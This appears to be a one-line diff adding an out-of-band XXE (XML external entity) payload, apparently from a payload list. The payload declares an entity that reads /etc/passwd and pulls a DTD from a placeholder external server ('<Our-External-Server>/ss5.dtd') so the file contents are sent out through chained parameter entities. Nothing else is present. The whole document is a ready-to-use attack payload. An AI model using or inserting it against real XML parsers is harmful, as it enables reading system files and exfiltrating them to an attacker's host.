@@ -1,0 +1,1 @@
+ <![CDATA[<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % data3 SYSTEM "file:///etc/passwd"><!ENTITY % sp SYSTEM "http://<Our-External-Server>/ss5.dtd">%sp;%param3;%exfil;]>]]>
